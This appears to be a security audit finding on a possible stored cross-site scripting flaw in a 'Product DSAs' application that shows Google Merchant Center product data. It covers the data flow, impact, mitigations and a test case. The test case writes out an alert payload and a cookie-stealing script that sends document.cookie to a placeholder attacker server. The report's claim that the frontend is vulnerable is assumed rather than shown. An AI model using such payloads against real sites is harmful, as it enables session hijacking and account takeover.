- Vulnerability Name: Potential Stored Cross-Site Scripting (XSS) in Product Data Display

- Description:
  1. An attacker with access to Google Merchant Center (GMC) modifies product data (e.g., title, description) to include a malicious JavaScript payload.
  2. The Product DSAs application, through its data gateway, fetches this modified product data from GMC.
  3. The backend API of Product DSAs serves this product data to the frontend web application without proper sanitization.
  4. A user, while interacting with the Product DSAs web interface (e.g., reviewing product data, campaign previews), triggers the rendering of this unsanitized product data in their browser.
  5. The malicious JavaScript payload embedded in the product data executes in the user's browser within the context of the Product DSAs web application.

- Impact:
  - **High**: Successful exploitation can lead to session hijacking (stealing user session cookies), account takeover, or manipulation of Google Ads campaign settings within the application's context. An attacker could potentially modify campaigns, budgets, or targeting settings, leading to financial loss or reputational damage for the victim.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
  - **None evident in the provided backend code.** The provided backend code focuses on data retrieval and processing but lacks explicit output sanitization mechanisms for web rendering. It is assumed that backend is not sanitizing data before sending to frontend.

- Missing Mitigations:
  - **Input Sanitization on the Backend**: The backend API should sanitize all data retrieved from external sources like Google Merchant Center before serving it to the frontend. This should include encoding or escaping HTML special characters and JavaScript-sensitive characters to prevent the execution of malicious scripts.
  - **Context-Aware Output Encoding on the Frontend**: The frontend web application should employ context-aware output encoding when rendering any data received from the backend, especially product data that originates from GMC or user inputs. This ensures that data is treated as data and not executable code in the browser.
  - **Content Security Policy (CSP)**: Implementing a strict Content Security Policy (CSP) can significantly mitigate the impact of XSS vulnerabilities by controlling the sources from which the browser is allowed to load resources and execute scripts.

- Preconditions:
  1. **Attacker Access to Google Merchant Center (GMC):** The attacker needs to have sufficient permissions within the victim's Google Merchant Center account to modify product data. This could be through compromised credentials or insider access.
  2. **Vulnerable Frontend Application:** The Product DSAs frontend application must be vulnerable to XSS, meaning it renders backend data without proper output encoding.
  3. **User Interaction:** A user with access to the Product DSAs application needs to interact with the application in a way that triggers the display of the compromised product data.

- Source Code Analysis:
  - **File: /code/app/data_gateway.py:** This file is responsible for fetching data from BigQuery, which in turn is populated from Google Merchant Center. The `load_products` function executes SQL queries (`get-products.sql`) to retrieve product information.
  - **File: /code/app/main.py:** The `execute` function orchestrates the data flow, calling `data_gateway.load_products` to fetch product data. This data is then used to generate campaign data for Google Ads Editor. The `server/server.py` (not analyzed in detail here as focus is backend) would likely serve this data via API endpoints.
  - **Absence of Sanitization:** Review of `/code/app/data_gateway.py`, `/code/app/main.py`, and `/code/server/server.py` shows no explicit sanitization or output encoding of product data before it's potentially served through the API. The code focuses on data retrieval and processing for Google Ads, not secure web rendering.

  Google Merchant Center (GMC) --> [Attacker injects XSS payload into product data] --> Modified GMC Product Data
                                      |
                                      V
  Product DSAs Data Gateway (/code/app/data_gateway.py) --> Fetches Modified Product Data from GMC
                                      |
                                      V
  Product DSAs Backend API (/code/server/server.py) --> Serves Unsanitized Product Data via API
                                      |
                                      V
  Product DSAs Frontend Web Application --> Renders Unsanitized Product Data in User's Browser --> [XSS Payload Execution]
  ```

- Security Test Case:
  1. **Precondition:** Ensure you have access to a Google Merchant Center account connected to a Product DSAs instance.
  2. **Login to Google Merchant Center:** Access the Google Merchant Center interface.
  3. **Modify Product Data:** Locate a product in your GMC feed and edit its `title` field to include the following XSS payload: `<script>alert('XSS Vulnerability')</script>`. Save the changes in GMC.
  4. **Access Product DSAs Web Application:** Open the Product DSAs web application in a browser and log in as a user with access.
  5. **Navigate to Product Data Display:** Navigate to a section in the Product DSAs application where product data (including titles) is displayed. This might be a product list view, a campaign preview, or any page that shows product information fetched from GMC.
  6. **Observe for XSS:** Check if an alert box with the message "XSS Vulnerability" appears in your browser when the page loads or when you interact with elements displaying the modified product title.
  7. **Verify Cookie Stealing (Advanced):** If the alert is successful, modify the payload to attempt cookie stealing. For example, change the payload to: `<script>window.location='http://attacker-server.com/log?cookie='+document.cookie;</script>`. Replace `http://attacker-server.com/log` with a server you control to capture the cookies. Monitor your attacker server logs to see if session cookies from the Product DSAs application are successfully sent when you interact with the application's interface displaying the modified product.
